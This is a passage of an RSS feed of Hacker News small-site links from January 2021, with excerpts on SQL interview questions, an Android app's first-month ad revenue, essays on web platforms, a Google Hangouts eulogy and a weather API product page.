Review</strong></p><ul><li>What's the difference between a <code>LEFT JOIN</code> and an <code>INNER JOIN</code>?</li><li>When would you use <code>UNION</code> vs <code>UNION ALL</code>? What if there were no duplicates?</li><li>What's the difference between <code>COUNT</code>and <code>COUNT DISTINCT</code>?</li><li>When would you use a <code>HAVING</code> clause versus a <code>WHERE</code> clause?</li></ul><p><strong>Basic SQL Question Example:</strong></p><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image.png 1000w, https://blog.interviewquery.com/content/images/2021/01/image.png 1306w" sizes="(min-width: 720px) 720px"></figure><blockquote><em>We're given two tables, a <code>users</code> table with demographic information and the neighborhood they live in and a <code>neighborhoods</code> table.</em></blockquote><blockquote><em>Write a query that returns all of the neighborhoods that have 0 users.</em></blockquote><p>Try answering this question with our <a href="https://www.interviewquery.com/questions/empty-neighborhoods">interactive SQL editor</a>.</p><p><strong>Here's a hint:</strong></p><p><em>Our predicament is to find all the neighborhoods without users that live in them. This means we have to introduce a <strong>concept of existence of a field in one table, while not existing in another.</strong></em></p><p><em>For example, let's say we generate some fake data of user's and the neighborhoods they live in. We would expect it to look something like this. </em></p><pre><code>neighborhoods.name  | users.id
____________________|__________
castro              | 1
castro              | 2
cole valley         | null
castro heights      | 3
sunset heights      | 4</code></pre><p><em>We see each user from one to four is appropriately placed in their respective neighborhood except for the neighborhood of Cole Valley. That's the neighborhood we're targeting for returning in our query. </em></p><p><em>Strategies: whenever the question asks about finding values with 0 something (users, employees, posts, etc..), immediately think of the concept of <strong><code>LEFT JOIN</code></strong>! An inner join finds any values that are in both tables, <strong>a left join keeps only the values in the left table</strong>.</em></p><p><em>Our predicament is to find all the neighborhoods without users. To do this, we must do a left join from the <code>neighborhoods</code> table to the <code>users</code> table.</em></p><p><em>If we then add in a where condition of <strong><code>WHERE users.id IS NULL</code></strong>, we will get every single neighborhood …</em></p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.interviewquery.com/blog-sql-interview-questions/">https://www.interviewquery.com/blog-sql-interview-questions/</a></em></p>]]>
            </description>
            <link>https://www.interviewquery.com/blog-sql-interview-questions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25709870</guid>
            <pubDate>Sun, 10 Jan 2021 04:15:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My app made $1300 in the first month and I failed to grow it]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25709368">thread link</a>) | @hgarg
<br/>
January 9, 2021 | https://harishgarg.com/writing/my-first-app-made-1300-dollars-in-1st-month/ | <a href="https://web.archive.org/web/*/https://harishgarg.com/writing/my-first-app-made-1300-dollars-in-1st-month/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <h3 id="TLDR"><a href="#TLDR" title="TLDR"></a>TLDR</h3><p>My first Android App made me $1300+ in its first month. I failed to maintain and grow it due to lack of focus.</p>
<h3 id="💵-Show-me-the-money"><a href="#💵-Show-me-the-money" title="💵 Show me the money"></a>💵 Show me the money</h3><p>My Adsense Account in Feb 2015.<br><img src="https://harishgarg.com/images/android-earnings-feb.png" alt="Android App Earnings - Feb 2015"></p>
<p>And this is what it looked like in Mar 2015.<br><img src="https://harishgarg.com/images/android-earnings-high.png" alt="Android App Earnings - Mar 2015"></p>
<p>All this from a single, simple app that displayed some Hindi to English phrases in a list format.</p>
<h3 id="🏗-The-process"><a href="#🏗-The-process" title="🏗 The process"></a>🏗 The process</h3><p>I got laid off from the place I worked for 11+ years (that’s another story which I will share in a future post) in Aug 2014. </p>
<p>My last position was as a manager overseeing a quality team where I began as an engineer 11 years back. I didn’t want to go back to the job of a manager at another company. So, if no job, then what? </p>
<p>I decided I am going to build web apps. I haven’t written any code for a few years. I had written PERL and Python but not for some years now. 37signals(now Basecamp) and DHH were all the rage then. So, I jumped into learning Ruby on Rails. I had never built a Full Stack App. I didn’t get much further. After a couple of months, I abandoned it. </p>
<p>Time to get on to the next shiny toy. Mobile Apps, especially on Android were still picking up. I decided to give it a shot. I narrowed down on the India Market. It was hard to get users in India to pay for apps. So, the obvious choice was to go with a Free App with in-app ads</p>
<p>I chose the learning category for my first app. I wanted to make sure I target the largest user-base. I narrowed it down to building a Learn English App for the Native Hindi Speakers. Hindi Speakers are the largest cohort by languages in India.</p>
<p>I had never programmed in Java or for Android before this. I spent a few weeks getting Android Studio to work on my Ubuntu laptop. At last, I cobbled together a simple list-based app. The first screen showed a list of phrase categories in both Hindi and English. For example Numbers, Greetings, and so on. Clicking on one of the categories takes you to the second screen with a list of phrases in that category. So, two screens and a JSON file with 100 odd words/phrases. I also added the logic of showing a small thin banner ad at the bottom of the page on the details screen.</p>
<p>I generated the build, created an Android Developer Account, and uploaded the App. This was the end of Feb. Nothing happened for a couple of Days. </p>
<h3 id="🌱-Green-shoots"><a href="#🌱-Green-shoots" title="🌱 Green shoots"></a>🌱 Green shoots</h3><p>Then a couple of days in Mar, I happened to log into the Developer Console and the No. of Installs was in 10,000s. I logged into Google Adsense. And it showed my estimated earnings to be a Few hundred dollars.</p>
<p>This was the first time I made money on the internet, outside a regular corporate job.</p>
<p>That Month, Adsense made me 1300 dollars. And throughout its lifetime, the app made me little over 2000 dollars and had MAUs at around 50K at its peak.</p>
<h3 id="☠-The-Mistakes"><a href="#☠-The-Mistakes" title="☠ The Mistakes"></a>☠ The Mistakes</h3><p>Yet, this is where I made my first big mistake. Instead of focusing on this one app, I started replicating it. For example, I made apps for Learn English from Kannada, Arabic, and so on. None of the other apps got any traction. I did some minor improvements to the main Hindi to English app. But the revenue &amp; usage tapered off in a couple of months.</p>
<p><img src="https://harishgarg.com/images/android-app-chart.png" alt="Android App Earnings"></p>
<p>If I get to re-do it, what would I do differently? I would double down on the first app. I would add more features for the Hindi users first. When the user growth got stabilized, only then I would have added more language pairs. Focus is what matters in the end.</p>

  </div></div>]]>
            </description>
            <link>https://harishgarg.com/writing/my-first-app-made-1300-dollars-in-1st-month/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25709368</guid>
            <pubDate>Sun, 10 Jan 2021 03:39:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rewilding the Web]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25708761">thread link</a>) | @exolymph
<br/>
January 9, 2021 | https://troynikov.io/rewilding-the-web/ | <a href="https://web.archive.org/web/*/https://troynikov.io/rewilding-the-web/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">

    <section>

        <header>
            <span>October 8, 2020</span>
            
                <p>The coming defeat of the platform monoculture. </p>
        </header>

        <p><img src="https://troynikov.io/content/images/2020/11/BA81E56A-64CB-4D9D-90BB-045B54CAC790.jpeg" alt="Rewilding the Web"></p>

        <div>
            <p>The web is a much duller place now than it was 20 years ago. A large part of the reason is that the early web was much more fragmented, creating many ecological niches which became inhabited by the various strange and delightful species that tend to flourish in such environments. </p><p>For a moment there was the idea that the web was mainly for publishing whatever you wanted, to your own website, and people could come look at it and interact with it wherever or whoever they were. And people chose to create some amazing things. </p><!--kg-card-begin: html--><blockquote darkmode="" data-title="Ghost Pages: A Wired.com Farewell to GeoCities" data-author="@wired" cite="https://www.wired.com/2009/11/geocities/">
The average person could create a web site for free, no questions asked. People took the opportunity and ran with it, building millions of pages –- 38 million at last count, according to Yahoo. They helped make the web a more vibrant territory, no longer the citadel of nerds in the know.

</blockquote><!--kg-card-end: html--><p>Nobody had yet found a way to index and catalogue everything, and so curation according to individual ideals and tastes was the norm. Webrings, blogrolls, portals, and other mechanisms let people actually find the things on the web that, to them as individuals, were worth finding. </p><p>But as more people got online and as using the web became more mainstream and less unusual, and eventually more about interaction than one-way publishing, the fragmentation gave way to a great wave of homogenization. The web is a massive distribution system with virtually zero marginal cost, and connecting everyone to everyone else in order to exploit the incredible power of <a href="https://a16z.com/2018/12/13/network-effects-dynamics-in-practice/">network effects</a>, is good business strategy. </p><p>People want to be where everyone else is. </p><p>Under that kind of selection pressure, <a href="https://en.wikipedia.org/wiki/Power_law">power law outcomes</a> are inevitable, and that gave rise to what we have now; almost everyone is on only a very few platforms. In order to keep users, the platforms have to try to please the greatest number of people, leading to boring and minimally controversial design decisions which nevertheless draw ire because they please no one in particular. </p><p>If everything has to be for everyone because everyone is connected to everyone else, nothing can really be for someone in particular. It has to turn into grey goo. Total networking means total boredom. And one by one the forums, blogs, and the <a href="https://en.wikipedia.org/wiki/Google_Reader">ecosystem</a> that sustained them and drove early web culture went dark, or were otherwise sidelined. </p><figure><img src="https://troynikov.io/content/images/2020/10/38ED9190-9C0D-41A6-BE7F-FCEEABC64F88.jpeg" alt="" srcset="https://troynikov.io/content/images/size/w600/2020/10/38ED9190-9C0D-41A6-BE7F-FCEEABC64F88.jpeg 600w, https://troynikov.io/content/images/size/w1000/2020/10/38ED9190-9C0D-41A6-BE7F-FCEEABC64F88.jpeg 1000w, https://troynikov.io/content/images/2020/10/38ED9190-9C0D-41A6-BE7F-FCEEABC64F88.jpeg 1020w" sizes="(min-width: 720px) 720px"><figcaption>The homogenizing effect of total networking was predicted in 1975, in <a href="http://worrydream.com/refs/Nelson-ComputerLibDreamMachines1975.pdf">Dream Machines / Computer Lib&nbsp;</a></figcaption></figure><p>Network effects have enormous lock-in. Once people are where everyone else is, they don't really want to leave. So is that it? Are we at <a href="https://diff.substack.com/p/big-tech-at-the-end-of-history">the end of history for big tech</a>? Are we doomed to endless debate about, of all things, content moderation policies? Is the only possible change to come from regulators breaking up the platform "monopolies" ?</p><p>I don't think so. </p><hr><p>Dissatisfaction with the platforms is rising in many corners, whether as part of a broader reaction to media institutions which now use the platforms as a distribution channel, or else just out of exasperation with the sorts of interactions that have become characteristic. The people no longer want uniform ideas from the usual suspects. </p><p>The platforms are aware of this dissatisfaction and have tried to adapt. The algorithmic feed was born out of the necessity of de-homogenizing what people saw, in an attemp to surface only things both relevant and interesting to each individual. But because on any given platform everyone gets the same algorithm, we now have the second order phenomenon where everyone sees whatever material is best at gaming the current iteration of the algorithm, and "<a href="https://www.theatlantic.com/technology/archive/2015/12/the-linguistics-of-youtube-voice/418962/">youtuber voice</a>". &nbsp;</p><p>Alongside the dissatisfaction in the mainstream, there are those for whom the dominant medium of the platforms isn't the right kind of frontier. These people are driven as creators by <a href="https://en.wikipedia.org/wiki/Thumos"><em>thymos</em></a>, a spirited sense of adventure and personal risk, who want to create something great and gain recognition and fame. </p><!--kg-card-begin: html--><blockquote darkmode="" data-title="Thriverism" data-author="@sonyasupposedly" cite="https://www.sonyasupposedly.com/thriverism/">
<p>The chance and challenge to express your will, to enact it on the world. The freedom and drive to forge a self that <em>matters</em> — to others, but also intrinsically. A self that self-justifies.</p>

</blockquote><!--kg-card-end: html--><p>These are people who want to fight and win in the noosphere, to convince you of their ideas and aesthetics. From these people the weird, unusual, provocative, and novel flows. Around them schools of thought and marketplaces of ideas form. They're already anchors or up-and-comers on the platforms themselves. </p><p>These are twin forces pulling in the same direction; to bring into existence new modes of creation and distribution that operate at human scale, not at the scale of power laws. Just as we are witnessing <a href="https://pullrequest.substack.com/p/the-prophet-of-the-revolt">the revolt of the public</a> tear through legacy institutions, we are about to witness a grass-roots revolt against the platforms, for and by the people for whom homogenization isn't satisfying. </p><p>And they have the tools to do so. </p><hr><p>The tools and infrastructure that made the web interesting in the first place never actually went away. &nbsp;And since then, <a href="https://www.patreon.com/">many</a> <a href="https://substack.com/">new</a> <a href="https://ghost.org/">tools</a> to do this have joined them. &nbsp;</p><p>For now the ecosystem being created by these tools just looks a lot like blogging but with paywalls, tailored to those who want to disintermediate the platforms by owning their own brand, and who want to bypass legacy media institutions by being paid directly by their fans. The communication is still largely one-way. But this misses the larger potential. </p><p>What these new tools offer is actually friction.</p><p>Whether monetary or reputational (as in the form of invite systems), these small tokens of commitment create just enough friction to get the kind of fragmentation that lets niches flourish instead of getting smoothed out at platform scale. It makes the edges of the network bumpy to traverse. And that gives ecological niches the room they need to grow or evolve without being globally sterilized. </p><p>Through these mechanisms the contributors / subscribers / fans, now connected directly to each creator, represent a directly addressable community bound by taste on the one hand and commitment on the other. Indeed we have seen <a href="https://www.lesswrong.com/">similar</a> <a href="https://en.wikipedia.org/wiki/Anonymous_(group)">communities</a> and their diaspora emerge with real-world identities from their on-line roots. The first signs of this are already in play, as more discussion moves to the private spaces of group chats, secret groups, and invite-only discussion communities. </p><p>With the right tools some of these communities will inevitably grow large, others will stay small deliberately. Some will often create and discuss openly in public, others only rarely. Each one free to set its own norms and identity, and to decide what success looks like. Some may federate and cross-pollinate, while others will represent deep and vertical identity. But they'll be interesting, they will create a sense of belonging and identity, and they'll be weird. </p><p>The platforms still have a role to play. Rather than being hosts and propagators of creativity directly, their function will shift to one of surfacing and discovery. On a vibrant, fragmented, culturally active web, there will be no shortage of things to try, communities to observe or join, people to be excited by. The communities are our families, private clubs, monasteries and brotherhoods, while the platforms will be the town square we congregate in. &nbsp;</p><p>This is a symbiotic relationship; the communities are what people will come to the platforms for, the platforms will have the wide distribution through which even the most esoteric community can find new members - necessary for keeping them alive and thriving. </p><hr><p>I don't believe it's possible to return to the early web, and it would be foolish to deny the human drives and desires that created the explosive growth and enormous scale of the platforms in the first place. But something new is on the horizon. </p><p>A new kind of symbiosis, between the vast scale of the platforms and the human interaction of the communities is now being built. The weird will inherit the web. &nbsp;</p><hr><p><em>Title image courtesy of <a href="https://www.nhm.ac.uk/discover/wildlife-photographer-of-the-year-fox-chernobyl-exclusion-zone.html">The Natural History Museum</a></em></p>
        </div>


        

    </section>

</div></div>]]>
            </description>
            <link>https://troynikov.io/rewilding-the-web/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25708761</guid>
            <pubDate>Sun, 10 Jan 2021 03:03:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Immediately Lowered My Heart Rate by Switching My Yogurt]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25708203">thread link</a>) | @vuciv1
<br/>
January 9, 2021 | https://jerseyfonseca.com/blogs/heartrate | <a href="https://web.archive.org/web/*/https://jerseyfonseca.com/blogs/heartrate">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://jerseyfonseca.com/blogs/heartrate</link>
            <guid isPermaLink="false">hacker-news-small-sites-25708203</guid>
            <pubDate>Sun, 10 Jan 2021 02:31:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Platform Is the Enemy]]>
            </title>
            <description>
<![CDATA[
Score 198 | Comments 77 (<a href="https://news.ycombinator.com/item?id=25708099">thread link</a>) | @nomdep
<br/>
January 9, 2021 | https://danielbmarkham.com/the-platform-is-the-enemy/ | <a href="https://web.archive.org/web/*/https://danielbmarkham.com/the-platform-is-the-enemy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="post-body">
        <p>The premise of the movie "Idiocracy" is simple: in the future mankind has de-evolved into morons. Technology does so much for everybody that nobody knows how it all works anymore. &nbsp;If we can't fix it, we're all going to die.</p><p>One character asks the other what he likes, The answer is money.</p><p>"I can't believe you like money too!" the first character says without irony, "We should hang out!"</p><figure><img src="https://cdn.danielbmarkham.com/2021/01/JRJcXbeoSOlkRRzbC7HJ_idiocracy.jpg" alt=""></figure><p>The gag here is that of course, most everybody likes money. If you reduce all of your life enough, it's just food, sex, money, and looking cool. But who would want to do that? Over the centuries, humans have created massively-complex societies because everybody has different things they like doing and thinking about, but all of that complexity can be reduced to, well, an idiocracy if you try hard enough.</p><p>The movie, however, is just a joke, right? We would never allow that to happen, of course, because that's not the goal of technology. Technology's goal is to make us better, not dumber.</p><p>Wait one. Is that true? What <em>is</em> the goal of technology, anyway? Has anybody ever clearly stated it?</p><p>Recently I've heard two goals:</p><ol><li>The goal of technology is to become a <strong>brain extension</strong>, <em>helping you to decide what to do</em> and then helping you get it done.</li><li>The goal of technology is to become a <strong>hand-held power tool</strong>, helping you accomplish the things you've <em>already decided to do</em></li></ol><p>That's not the same thing. It turns out the difference is critical.</p><p>The old goal was much simpler: make something people want. I like that goal! It boils down the job of creating technology to the most important parts, need and ability. But was that sustainable? At the end of the day, don't we always end up making some combination of stuff that either helps us <em>make decisions</em> or helps us <em>implement decisions</em> we've already made? And aren't the two fundamentally incompatible in a future society?</p><p>Yelp tells you which restaurant to go to. Your GPS automatically takes you there. These are not just different problems, they're different <em>kinds of problems</em>. Getting from point A to point B is a matter of math and geometry. Which restaurant is the best tonight? You could spend hours debating that with friends.</p><p>If you reduce anything down enough it becomes idiotic. Each piece of technology we deploy can have the goal of helping us do what we've already decided or helping us decide what to do. The first option leaves the thinking up to us. The second option "helps" us think.</p><figure><iframe width="267" height="200" src="https://www.youtube.com/embed/sZHCVyllnck?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>You like money too? Wow! I like money! We should hang out!</p><p>Human brains are not computers. Brains are designed to help us survive and pass on our genes using the minimum amount of energy available. If the GPS takes me where I'm going, I don't need to know how to use maps anymore. So I stop knowing how to use maps. Dump those neurons, they're not needed. If Yelp picks the restaurants for me enough, I stop having nuanced preferences about restaurants. That energy expenditure is no longer needed for survival and reproduction. Dump those neurons. Over time people stop caring about the tiny details of what the difference is between a good and a great restaurant. Yelp handles that.</p><p>For some folks, who cares? It's food. Go eat it. For other folks, picking the right place can be a serious undertaking, worthy of heavy thought and consideration. But if over the years apps like Yelp boil all of that down to four or five stars, then our collective brain is not going to bother with it. Human brains are not computers. If computers do the work for us, we turn off those neurons and save energy.</p><p>Meanwhile, on social media there's currently this huge discussion. One bunch of folks says that social media is being overbearing in its censorship of fringe and sometimes hateful opinions. The other bunch of folks says social media is a festering sore full of people who are ugly, hateful, and abusive to those weakest among us. The community has to set standards.</p><p>There doesn't have to be a right and wrong here. I think the crucial thing to to understand that both sides can be entirely correct. We are dealing with the same kind of question.</p><p>All three of these topics -- whether humanity is becoming idiots or not, what the ultimate goal of technology is or should be, and how social media should work -- are intricately related. They're related because of this: <em>the platform is the enemy</em>.</p><p>The minute we create a platform for something, whether it's rating movies, tracking projects, or chatting with friends about work, as that platform takes over mindshare, <em>the assumption becomes that this is a solved problem</em>.</p><p>The telephone was great. Once we had the telephone, people didn't have to worry about how to talk to people far away anymore. Just pick up the phone. Solved problem.</p><p>Facebook is great. Once we had Facebook, people didn't have to worry about how to interact with their friends in a social setting anymore. Just click on the little FB notification (Which seems to be always flashing for some reason to get my attention) Solved problem?</p><p>But these are entirely different things! With the phone, I know who I want to call and why. I push buttons and we are connected. The tech helps me do what I've already decided to do. With Facebook, on the other hand, they get paid to show me things in a certain order. The premise is that I'm waiting (or "exploring" if you prefer) until I find something to interact with. The phone is a tool for me to use. I am the tool Facebook is using. I am no longer acting. I am reacting.</p><p>And even if they weren't paid, interacting with friends socially is an extremely complex affair. What kind of mood are they in? What's their life history? What things are bad to bring up? How does their body language look? Facebook's gimmick is "Hey, we've reduced all of this to bits and bytes, and we'll even show you what bits and bytes to look at next!"</p><p>Solved problem.</p><p>Many, many people do not use the internet, the internet uses them. And this percentage is constantly growing.</p><figure><img src="https://cdn.danielbmarkham.com/2021/01/9EBNeUmSy6TMDUpKTLL6_terminator-robot.jpg" alt=""></figure><p>Just like the restaurant example, maybe that's fine. I have friends, I have opinions, who cares? It's all idle chat anyway.</p><p>That logic can be true for a bunch of things, but can't be true for <em>everything</em>. Otherwise, at some point 100 years from now, we're comparing our life values and end up saying something like "I like money too". Everything can't all be reduced down to the lowest common denominator. If it does, we all die.</p><p>Life is not a bit or byte, a number to be optimized. It's meaning we define ourselves, in ways we should not quantize.</p><p>Platforms, by their very nature, constantly send out the subtle message: <em>This is a solved problem. No further effort on your part is required here. No thinking needed.</em> Platforms resist change. They resist their own evolution by subtly poisoning the discussion before it even starts.</p><p>Are restaurant choices more or less important than which movie to watch tonight? There's no right or wrong answer to these questions. We have nice categories like restaurants and movies because currently people consider those things to be different kinds of choices. But why? If the algorithm is king, why shouldn't an algorithm determine both of those things for me? And if it does, why should I bother with worrying about which category is which?</p><p>Human brains are not computers. Let the platform decide. Energy not needed. Dump those neurons.</p><p>This is the more important point. It's not that the platforms turn what might be complex things into simple numbers, or even that they monetize attention. It's that by turning everything into numbers, over time they destroy the distinction between the categories entirely. Platforms are the enemy because they resist analysis in the areas they dominate.</p><p>Platforms turn into settled fact things that should be open for debate, like whether or not Taco Bell is a Mexican restaurant, or whether Milo is an artist with something useful to tell us. (I'm going with "no" and "no" for both of these.) More dangerously, they do the work of deciding <em>what categories various things go into</em>. This category over here is important. That category over there is not. We all make these decisions, and they're all different, and the categories each of us pays careful attention to and loves obsessing about are all different, and because we all have different viewpoints and priorities humankind advances in thousands of directions simultaneously. We survive. We evolve.</p><p>Twitter has to decide whether PERSON_X can speak or not because on the Twitter platform, that question has to have a yes or no answer based on the person. Twitter's category for deciding who can speak is "who is that?" Is that the right category for social conversations? For political conversations? For conversations about philosophy? Math? Who knows? Who cares? Twitter has decided. Solved problem.</p><p>Everybody has different things they like doing and thinking about. Different conversations and audiences have different criteria. Some problems should never be solved. Or rather more directly, some problems should never have a universal answer.</p><p>An aside: We see the same thing in programming. One bunch of folks creates various platforms in order to do the thinking for another bunch of folks. Sometimes these platforms take off and become industry standards. That's quite rare, however. Most of the time we end up training morons who can weakly code against the platform but can't reason effectively about the underlying architecture or reason for the platform to exist in the first place. In our desire to help, we harm the very people we're trying to assist -- by subtly giving them the impression that this is a solved problem. Programmers are just a decade or so ahead of the rest of us.</p><p>Popular platforms aren't just a danger economically because they control commerce. They're not just a danger politically because they selectively control and amplify political discourse. They're an extinction-level, existential danger to humans because they prevent people from seriously considering what kinds of categories are important in …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danielbmarkham.com/the-platform-is-the-enemy/">https://danielbmarkham.com/the-platform-is-the-enemy/</a></em></p>]]>
            </description>
            <link>https://danielbmarkham.com/the-platform-is-the-enemy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25708099</guid>
            <pubDate>Sun, 10 Jan 2021 02:23:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Design your own iOS 14 icons]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25707945">thread link</a>) | @millibar
<br/>
January 9, 2021 | https://myicon.io/ios-14-icon-editor | <a href="https://web.archive.org/web/*/https://myicon.io/ios-14-icon-editor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://myicon.io/ios-14-icon-editor</link>
            <guid isPermaLink="false">hacker-news-small-sites-25707945</guid>
            <pubDate>Sun, 10 Jan 2021 02:10:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Podcast on innovation systems, with Ben Reinhardt]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25707442">thread link</a>) | @willbobaggins
<br/>
January 9, 2021 | https://narrativespodcast.com/2020/12/21/21-innovation-systems-with-ben-reinhardt/ | <a href="https://web.archive.org/web/*/https://narrativespodcast.com/2020/12/21/21-innovation-systems-with-ben-reinhardt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1985">

                    
                    <div>
                        
<p>In this episode, we talk with Ben Reinhardt about different innovation systems, how to create more sci-fi technology a reality, and why our research institutions are not as effective as they used to be. You can check out Ben’s work at https://benjaminreinhardt.com/about/.</p>



<div><p>Some things mentioned in the episode: </p><p><a href="https://slatestarcodex.com/2020/05/12/studies-on-slack/">Studies on Slack</a></p></div>



<p><a href="https://en.wikipedia.org/wiki/Donald_Braben">Don Braben</a></p>



<p><a href="https://en.wikipedia.org/wiki/DARPA">DARPA</a></p>



<p>Ben’s <a href="https://twitter.com/ben_reinhardt?lang=en">Twitter</a></p>



<figure></figure>
                                            </div>

                </article></div>]]>
            </description>
            <link>https://narrativespodcast.com/2020/12/21/21-innovation-systems-with-ben-reinhardt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25707442</guid>
            <pubDate>Sun, 10 Jan 2021 01:30:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Hangouts: A Eulogy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25707127">thread link</a>) | @dredmorbius
<br/>
January 9, 2021 | http://decafbad.net/2021/01/09/google-hangouts-a-eulogy/ | <a href="https://web.archive.org/web/*/http://decafbad.net/2021/01/09/google-hangouts-a-eulogy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      <p>This year Google will stop supporting and remove Google Hangouts. Google Hangouts, if you're not aware, was Google's replacement for their chat program Google Talk. Google Talk was a XMPP-based chat client that was available for all users of Google services. Google Hangouts was rolled out around the same time as Google+, and was a wrapper for many different Google services (phone, video chats, and Hangouts on Air). What was nice about it was that anyone that you knew the GMail address of had access to Google Hangouts. This meant that many of my friends had Hangouts access. JoDee and I used Hangouts for much of our IM communication. Unfortunately for whatever reason Google decided to remove yet another of the things that I liked about Google services, and proves once again that Google can't be trusted with any social platform.</p>
<p>Today I downloaded the "Google Takeout" of Hangouts and removed all of the old chats. There were a lot of nice memories in there, and now they can live in a collection of photos and one long JSON dump file that I'll probably never read again.</p>
<p>If you want to find me I'm on Signal and Quicksy (an XMPP-based service using phone numbers and OMEMO for encryption). If you have my phone number you can use these services to get a hold of me. I'm still on IRC and have accounts on other platforms. But what seems a constant is that communication will be fractured over multiple platforms and the dream of having one application doing everything well dies on July, 2021. And the irritation of having yet-another-platform to talk to that one person is the reality we'll all have to deal with until something better comes along. Nothing is perfect and everything is terrible.</p>
<p>RIP Hangouts. You helped me not have to think about messaging.</p>
    </div></div>]]>
            </description>
            <link>http://decafbad.net/2021/01/09/google-hangouts-a-eulogy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25707127</guid>
            <pubDate>Sun, 10 Jan 2021 01:07:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facebook and Twitter Promote Propaganda and Disinformation. We Can Do Better]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25706694">thread link</a>) | @dyoder
<br/>
January 9, 2021 | https://byline.dashkite.com/post/dashkite/w_ljVZkIbMtrtkekpwUnBg/facebook-and-twitter-promote-propaganda-and-disinformation | <a href="https://web.archive.org/web/*/https://byline.dashkite.com/post/dashkite/w_ljVZkIbMtrtkekpwUnBg/facebook-and-twitter-promote-propaganda-and-disinformation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://byline.dashkite.com/post/dashkite/w_ljVZkIbMtrtkekpwUnBg/facebook-and-twitter-promote-propaganda-and-disinformation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25706694</guid>
            <pubDate>Sun, 10 Jan 2021 00:19:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Weather Data API with historical weather and 15-day forecast data]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25706592">thread link</a>) | @Leftium
<br/>
January 9, 2021 | https://www.visualcrossing.com/weather-api | <a href="https://web.archive.org/web/*/https://www.visualcrossing.com/weather-api">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="posts">
					
					
						<div id="">
								
								<p><a href="https://github.com/visualcrossing/WeatherApi/" title="Weather API Samples"><img src="https://www.visualcrossing.com/images/excel-weather/coder_300x200.png" alt="Weather API for JavaScript and web development"></a>
								</p>
								<div>
									
									
									<div>
										<p>
											Visual Crossing Weather API requests are RESTful calls that you can make easily from both client and server.  
											You can incorporate weather data into your application, website or weather app in a matter of minutes. 
											Simply follow our tutorials and sample code. Need a free weather api? Our weather data API is free up to 1000 results/day.
										</p>

										<ul>
											<li><i></i>Easy integration with <a href="https://www.visualcrossing.com/resources/documentation/weather-api/how-to-load-weather-data-in-javascript/" title="How to load weather data in JavaScript">JavaScript, D3 &amp; jQuery</a></li>
											<li><i></i>HTTPS encryption for security and compliance</li>
											<li><i></i>Cross-Origin Resource Sharing (<a href="https://enable-cors.org/" `rel="noopener" title="enable cross-origin resource sharing" target="_blank">CORS</a> ) for secure cross-domain requests</li>
											<li><i></i>Secure API Key for account protection &amp; tracking</li>
											<li><i></i>Compatible for both client and server usage</li>
											<li><i></i>Enable weather in your application in minutes</li>
										</ul>
									</div>

								</div>
						</div>
					
						
						
						
						<div id="">
								
								<p><a href="https://www.visualcrossing.com/resources/documentation/weather-api" title="Weather API Documentation"><img src="https://www.visualcrossing.com/images/excel-weather/coder_300x200.jpg" alt="Historical Weather Data for Java, Python, Perl"></a>
								</p>
								<div>
									
									
									<div>
											<p>
										RESTful APIs are ideal for integration in all programming languages including Java, .NET, Python &amp; Perl.  
										Access the entire Visual Crossing Weather database including weather history data, weather forecasts, real time conditions to power any application.
										</p>
										
										<p>
										Results are available in common data formats including JSON and CSV.
										Integrating the data into your application is straightforward.
										</p>
										<ul>
											<li><i></i>Full access to historical weather, forecasts, and climate statistics</li>
											<li><i></i>Data formats include JSON and CSV</li>
											<li><i></i>Support for multiple locations and dates in a single request</li>
											<li><i></i>Documentation and samples available</li>
